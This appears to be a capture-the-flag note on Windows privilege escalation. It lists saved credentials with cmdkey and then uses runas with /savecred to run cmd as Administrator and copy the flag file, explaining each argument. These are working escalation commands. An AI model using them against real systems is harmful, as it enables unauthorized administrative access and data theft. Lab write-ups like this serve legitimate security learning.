## RunAs Privilege Escalation via Stored Credentials

Finding stored credentials can be accomplished using one simple command:

```
cmdkey /list
```

- **Command Execution**:
    
    ```
    C:\Users\security>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Adminstrator\Desktop/root.txt > C:\Users\Security/root.txt"
    ```
    
- **Explanation**:
    
    - **`runas.exe`**: This command is used to run a program as another user. In this case, it's running as the `Administrator` user.
    - **`/user:ACCESS\Administrator`**: Specifies the user account to run the command as.
    - **`/savecred`**: Saves the credentials for the specified user so you don't have to enter the password each time.
    - **`cmd.exe /c`**: Runs the specified command and then terminates.
    - **`TYPE C:\Users\Adminstrator\Desktop/root.txt`**: Reads the contents of the `root.txt` file located on the Administrator's desktop.
    - **`> C:\Users\Security/root.txt`**: Redirects the output (contents of `root.txt`) to a new file called `root.txt` in the `C:\Users\Security` directory
